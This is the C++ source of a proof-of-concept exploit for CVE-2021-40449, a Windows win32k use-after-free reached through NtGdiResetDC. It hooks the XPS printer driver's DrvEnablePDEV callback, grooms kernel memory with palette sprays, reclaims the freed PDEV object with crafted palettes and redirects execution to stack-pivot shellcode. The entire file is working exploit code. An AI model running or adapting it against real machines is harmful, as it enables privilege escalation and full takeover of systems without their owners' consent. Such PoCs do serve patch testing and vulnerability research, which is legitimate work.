// CVE-2021-40449_poc.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <stdio.h>
#include <winddi.h>

#include "shellcode.h"
#include "MinHook.h"

#if defined _M_X64
#pragma comment(lib, "libMinHook.lib")
#elif defined _M_IX86
#pragma comment(lib, "libMinHook.x86.lib")
#endif

PVOID generatePivotAddress(BOOL debug);
typedef DHPDEV (APIENTRY * DrvEnablePDEVFunc)(DEVMODEW* , LPWSTR   , ULONG    , HSURF* , ULONG    , ULONG* , ULONG    , DEVINFO* , HDEV     , LPWSTR   , HANDLE   );
typedef BOOL(__stdcall * fnNtGdiResetDC)(HDC, struct _devicemodeW*, DWORD*, DRIVER_INFO_2W*, PVOID);
typedef BOOL (__stdcall * fnDrvEnableDriver)(ULONG, ULONG, DRVENABLEDATA*);

DrvEnablePDEVFunc origFunc = NULL;
HDC hdc = NULL;
BOOL g_bRan = FALSE;
fnNtGdiResetDC NtGdiResetDC = NULL;
HPALETTE* hPalArr = NULL;
LOGPALETTE* pal = NULL;
PVOID scaddr = NULL;

#define NUM_TMP_DELAYED_ALLOCS 32
#define SPRAY_SIZE 9800
#define CATCH_SIZE 300

//BOOL hookDrvResetPDEV(DHPDEV dhpdevOld, DHPDEV dhpdevNew)
DHPDEV DrvEnablePDEV(DEVMODEW* pdm, LPWSTR   pwszLogAddress, ULONG    cPat, HSURF* phsurfPatterns, ULONG    cjCaps, ULONG* pdevcaps, ULONG    cjDevInfo, DEVINFO* pdi, HDEV     hdev, LPWSTR   pwszDeviceName, HANDLE   hDriver)
{
    printf("[+] In callback\n");
    if (!g_bRan) {
        g_bRan = TRUE;
        HPALETTE* hUAFPalArr = malloc(CATCH_SIZE * sizeof(HPALETTE*));

        // Create driver info struct
        HANDLE hPrint = NULL;
        if (!OpenPrinter(L"Microsoft XPS Document Writer", &hPrint, NULL)) {
            printf("[-] Failed Opening driver: %d\n", GetLastError());
            ExitProcess(0);
        }
        DRIVER_INFO_2W* drvInfo = (DRIVER_INFO_2W*)malloc(0x500);
        DWORD bytesNeeded = 0;
        if (!GetPrinterDriver(hPrint, NULL, 2, (LPBYTE)drvInfo, 0x500, &bytesNeeded)) {
            printf("[-] Failed getting driver info: %d\n", GetLastError());
            ExitProcess(0);
        }

        // Get DEVMODE
        PDEVMODEW devmodew = (PDEVMODEW)malloc(0x1500);
        DocumentPropertiesW(NULL, hPrint, L"Microsoft XPS Document Writer", devmodew, NULL, DM_OUT_BUFFER);
        BOOL f = FALSE;

        // Try to call NtGdiResetDc directly to avoid the population of the DRIVER_INFO_2W struct by ResetDCWInternal
        BOOL res = NtGdiResetDC(hdc, NULL, &f, drvInfo, NULL);

        // Capture the freed object
        DWORD err_count = 0;
        PALETTEENTRY * parr = pal->palPalEntry;
        for (int i = 0; i < 0x360; i++) {
            parr[i].peRed = 0x01;
            parr[i].peGreen = 0x02;
            parr[i].peBlue = 0x03;
            parr[i].peFlags = 0x04;
        }
        *((ULONG_PTR *)((PUCHAR)parr + 0xa60)) = scaddr;

        for (int i = 0; i < CATCH_SIZE; i++) {
            hUAFPalArr[i] = CreatePalette(pal);
            if (!hUAFPalArr[i]) err_count++;
        }

        // Free some GDI space so the callback succeeds
        for (int i = 3000; i < 6000; i++) {
            if (hPalArr[i]) DeleteObject(hPalArr[i]);
        }

        if (!res) {
            printf("[-] Failed inner ResetDC: %d\n", GetLastError());
        } else {
            printf("[+] Inner ResetDC successfull\n");
        }
        printf("[+] ------ Press anything to trigger shellcode\n");
        getchar();
    }
    DHPDEV dhpdev;
    dhpdev = origFunc(pdm, pwszLogAddress,cPat, phsurfPatterns,cjCaps, pdevcaps,cjDevInfo, pdi,  hdev,  pwszDeviceName,   hDriver);
    return dhpdev;
}


BOOL pattern_search(PUCHAR addressBase, PUCHAR maxAddress, UCHAR* pattern, PUCHAR* addressPattern, SIZE_T searchSize)
{
    for (*addressPattern = addressBase; (maxAddress > addressBase) ? (*addressPattern <= maxAddress) : (*addressPattern >= maxAddress); *addressPattern += (maxAddress > addressBase) ? 1 : -1)
        if (RtlEqualMemory(pattern, *addressPattern, searchSize))
            return TRUE;
    *addressPattern = NULL;
    return FALSE;
}


PVOID getDrvEnablePDEVFunc_pattern()
{
    // That's the usermode driver of the default XPS printer
    HMODULE spoolerDrv = LoadLibraryA("mxdwdrv.dll");

    //// Updated windows 10
    //unsigned char DrvEnablePDEVPattern[80] = {
    //    0x40, 0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x81, 0xEC, 0x10,
    //    0x09, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x68, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x05, 0xCD,
    //    0xDA, 0x0C, 0x00, 0x48, 0x33, 0xC4, 0x48, 0x89, 0x84, 0x24, 0x00, 0x09, 0x00, 0x00, 0x4D, 0x8B,
    //    0xE1, 0x45, 0x8B, 0xF8, 0x4C, 0x8B, 0xF1, 0x4C, 0x8B, 0xAC, 0x24, 0x78, 0x09, 0x00, 0x00, 0x48,
    //    0x8B, 0x84, 0x24, 0x88, 0x09, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x60, 0x48, 0x8B, 0xBC, 0x24
    //};

    //// Windows 10 1803
    //unsigned char DrvEnablePDEVPattern[64] = {
    //    0x40, 0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x81, 0xEC, 0x10,
    //    0x09, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x68, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x05, 0xED,
    //    0xCC, 0x0C, 0x00, 0x48, 0x33, 0xC4, 0x48, 0x89, 0x84, 0x24, 0x00, 0x09, 0x00, 0x00, 0x4D, 0x8B,
    //    0xE1, 0x45, 0x8B, 0xF8, 0x4C, 0x8B, 0xF1, 0x4C, 0x8B, 0xAC, 0x24, 0x78, 0x09, 0x00, 0x00, 0x48
    //};

    // Windows 10 1709
    unsigned char DrvEnablePDEVPattern[64] = {
        0x40, 0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x81, 0xEC, 0x10,
        0x09, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x68, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x05, 0xAD,
        0xBC, 0x0C, 0x00, 0x48, 0x33, 0xC4, 0x48, 0x89, 0x84, 0x24, 0x00, 0x09, 0x00, 0x00, 0x4D, 0x8B,
        0xE1, 0x45, 0x8B, 0xF8, 0x4C, 0x8B, 0xF1, 0x4C, 0x8B, 0xAC, 0x24, 0x78, 0x09, 0x00, 0x00, 0x48
    };
    PVOID func;
    if (!pattern_search(spoolerDrv, spoolerDrv + 0x30000, DrvEnablePDEVPattern, &func, 0x30)) {
        printf("[-] Failed pattern searching\n");
        return NULL;
    }
    return func;
}

PVOID getDrvEnablePDEVFunc_functable()
{
    // That's the usermode driver of the default XPS printer
    HMODULE spoolerDrv = LoadLibraryA("mxdwdrv.dll");
    fnDrvEnableDriver fDrvEnableDriver = (fnDrvEnableDriver)GetProcAddress(spoolerDrv, "DrvEnableDriver");
    if (!fDrvEnableDriver) {
        printf("[-] Failed getting DrvEnableDriver function: %d\n", GetLastError());
        return NULL;
    }
    DRVENABLEDATA* pded = calloc(0x1000, 1);
    if (!fDrvEnableDriver(DDI_DRIVER_VERSION_NT4, 0x1000, pded)) {
        printf("[-] Failed running DrvEnableDriver function: %d\n", GetLastError());
        return NULL;
    }
    PVOID func = NULL;
    for (int i = 0; i < pded->c; i++) {
        if (pded->pdrvfn[i].iFunc == INDEX_DrvEnablePDEV) {
            func = (PVOID)pded->pdrvfn[i].pfn;
            break;
        }
    }
    // DrvDisableDriver()
    return func;
}


int main()
{

    // Setup the stack pivot shellcode and stack
    scaddr = generatePivotAddress(FALSE);
    if (!scaddr) {
        printf("[-] Failed initializing stack pivot shellcode\n");
        return 0;
    }

    // The "ntdll" equivalent for win32k syscalls
    HMODULE hSys = GetModuleHandle(L"win32u.dll");
    if (!hSys) {
        printf("[-] Failed GetModuleHandle: %d\n", GetLastError());
        return 0;
    }
    NtGdiResetDC = (fnNtGdiResetDC)GetProcAddress(hSys, "NtGdiResetDC");
    if (!NtGdiResetDC) {
        printf("[-] Failed GetProcAddress: %d\n", GetLastError());
        return 0;
    }

    // Default printer that should be found on every Windows
    hdc = CreateDC(L"WINSPOOL", L"Microsoft XPS Document Writer", NULL, NULL);
    if (!hdc) {
        printf("[-] Failed CreateDC: %d\n", GetLastError());
        return;
    }
    printf("[+] Created DC\n");

    if (MH_Initialize() != MH_OK) {
        return 1;
    }

    DrvEnablePDEVFunc origEnableFuncAddr = getDrvEnablePDEVFunc_functable();
    if (!origEnableFuncAddr) {
        printf("[-] Failed finding DrvEnablePDEV function\n");
        return 0;

    }

    origFunc = origEnableFuncAddr;
    MH_STATUS status = MH_CreateHook((LPVOID)origEnableFuncAddr, &DrvEnablePDEV, (LPVOID*)&origFunc);
    if (status != MH_OK) {
        return 1;
    }

    // Enable the hook
    printf("[+] Hooking DrvEnablePDEV function\n");
    status = MH_EnableHook(origEnableFuncAddr);
    if (status != MH_OK) {
        return 1;
    }

    // Temp palette allocations to fill the pending free list
    hPalArr = malloc(SPRAY_SIZE * sizeof(HPALETTE*));
    HPALETTE * hTmpPalArr = malloc(NUM_TMP_DELAYED_ALLOCS * sizeof(HPALETTE *));
    LOGPALETTE* tmppal = (LOGPALETTE*)malloc(sizeof(LOGPALETTE) + 0x50 * sizeof(PALETTEENTRY));
    tmppal->palVersion = 0x300;
    tmppal->palNumEntries = 0x50;
    //DebugBreak();
    printf("[+] Creating delayed free palettes\n");
    for (int i = 0; i < NUM_TMP_DELAYED_ALLOCS; i++) {
        hTmpPalArr[i] = CreatePalette(tmppal);
    }

    // On windows 1709, PDEVOBJ size is 0xe30
    // Each palette is 0xa0 + numOfPalettes*4
    pal = (LOGPALETTE*)malloc(sizeof(LOGPALETTE) + 0x364 * sizeof(PALETTEENTRY));
    pal->palVersion = 0x300;
    pal->palNumEntries = 0x364;

    printf("[+] Spraying palettes of size 0xe30\n");
    DWORD err_count = 0;
    for (int i = 0; i < SPRAY_SIZE; i++) {
        hPalArr[i] = CreatePalette(pal);
        if (!hPalArr[i]) err_count++;
    }

    // Create a hole
    printf("[+] Creating holes\n");
    DeleteObject(hPalArr[2000]);
    DeleteObject(hPalArr[4000]);
    DeleteObject(hPalArr[6000]);

    // Free the delayed
    printf("[+] Freeing delayed\n");
    for (int i = 0; i < NUM_TMP_DELAYED_ALLOCS; i++) {
        DeleteObject(hTmpPalArr[i]);
    }

    HDC hdcr;
    printf("[+] Triggering exploit...\n");
    hdcr = ResetDC(hdc, NULL);

    // Sometimes the process crashes before it reaches here

    //if (MH_DisableHook(&origEnableFuncAddr) != MH_OK) {
    //    return 1;
    //}

    //// Uninitialize MinHook.
    //if (MH_Uninitialize() != MH_OK) {
    //    return 1;
    //}

    DeleteDC(hdc);
    return 0;
}
